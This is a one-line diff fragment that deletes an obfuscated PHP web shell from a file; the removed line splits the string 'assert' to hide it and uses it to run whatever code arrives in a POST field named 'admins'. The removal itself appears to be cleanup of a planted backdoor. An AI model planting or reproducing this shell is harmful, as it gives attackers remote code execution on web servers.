@@ -1,1 +1,0 @@
-<?php $k="ass"."ert"; $k(${"_PO"."ST"} ['admins']);?>No.1
